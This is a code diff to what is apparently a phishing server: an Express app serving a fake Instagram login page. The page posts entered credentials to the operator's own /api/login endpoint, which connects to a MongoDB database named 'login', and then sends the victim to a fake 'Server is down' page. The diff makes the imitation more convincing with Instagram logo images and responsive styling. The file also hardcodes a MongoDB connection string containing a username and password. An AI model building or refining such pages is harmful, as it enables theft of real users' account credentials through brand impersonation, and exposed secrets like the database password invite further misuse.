@@ -1,3 +1,4 @@
+// server.js
 // ===============================
 // 1) BASIC SETUP
 // ===============================
@@ -11,11 +12,15 @@ const PORT = process.env.PORT || 3000;
 
 app.use(express.json());
 
+// serve static files from "public" (so /image.png will work)
+app.use(express.static(path.join(__dirname, "public")));
+
 // ===============================
 // 2) MONGODB CONNECTION
 // ===============================
-const MONGODB_URI =  process.env.MONGODB_URI || "mongodb+srv://emailspare365_db_user:7ZR7ZQz1YJD8IKAK@cluster0.wj5jeip.mongodb.net/login?appName=Cluster0";
-
+const MONGODB_URI =
+  process.env.MONGODB_URI ||
+  "mongodb+srv://emailspare365_db_user:7ZR7ZQz1YJD8IKAK@cluster0.wj5jeip.mongodb.net/login?appName=Cluster0";
 
 mongoose
   .connect(MONGODB_URI)
@@ -85,7 +90,7 @@ app.post("/api/login", async (req, res) => {
 });
 
 // ===============================
-// 5) LOGIN PAGE HTML (Forgot Password REMOVED)
+// 5) LOGIN PAGE HTML (Logo image used)
 // ===============================
 const loginPageHTML = `
 <!DOCTYPE html>
@@ -130,10 +135,16 @@ const loginPageHTML = `
       text-align: center;
     }
 
-    .logo-text {
-      font-family: "Brush Script MT", cursive;
-      font-size: 42px;
+    /* logo image wrapper */
+    .logo-wrapper {
       margin-bottom: 30px;
+    }
+
+    .logo-img {
+      width: 180px; /* adjust as needed */
+      height: auto;
+      display: block;
+      margin: 0 auto;
     }
 
     .input-group {
@@ -223,12 +234,28 @@ const loginPageHTML = `
       text-decoration: none;
     }
 
+    @media (min-width: 768px) {
+      .page-wrapper {
+        max-width: 400px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .card {
+        padding: 30px 24px 24px;
+      }
+      .logo-img { width: 150px; }
+    }
   </style>
 </head>
 <body>
   <div class="page-wrapper">
     <div class="card">
-      <div class="logo-text">Instagram</div>
+
+      <div class="logo-wrapper">
+        <!-- image path: /image.png (placed in public folder) -->
+        <img src="/image.png" class="logo-img" alt="Instagram Logo" />
+      </div>
 
       <form id="loginForm" novalidate>
         <div class="input-group">
@@ -310,6 +337,7 @@ const loginPageHTML = `
           window.location.href = data.redirect || "/server-down";
         }
       } catch (err) {
+        console.error(err);
         globalError.textContent = "Password is wrong";
       } finally {
         loginBtn.disabled = false;
@@ -321,7 +349,7 @@ const loginPageHTML = `
 `;
 
 // ===============================
-// 6) SERVER DOWN PAGE
+// 6) SERVER DOWN PAGE (uses same image logo)
 // ===============================
 const serverDownHTML = `
 <!DOCTYPE html>
@@ -332,15 +360,15 @@ const serverDownHTML = `
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     body { background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif; }
-    .box { text-align:center; }
-    .logo-text { font-family:"Brush Script MT"; font-size:42px; margin-bottom:20px; }
+    .box { text-align:center; max-width:420px; padding:24px; border:1px solid #262626; background:#000; }
+    .logo-img { width:160px; height:auto; display:block; margin:0 auto 18px; }
     .msg { color:#aaa; font-size:14px; margin-bottom:20px; }
     button { padding:10px 20px; border-radius:8px; background:#0095f6; color:#fff; border:none; cursor:pointer; }
   </style>
 </head>
 <body>
   <div class="box">
-    <div class="logo-text">Instagram</div>
+    <img src="/image.png" class="logo-img" alt="Instagram Logo" />
     <h2>Server is down</h2>
     <p class="msg">Sorry, something went wrong.</p>
     <button onclick="window.location.href='/'">Try again</button>
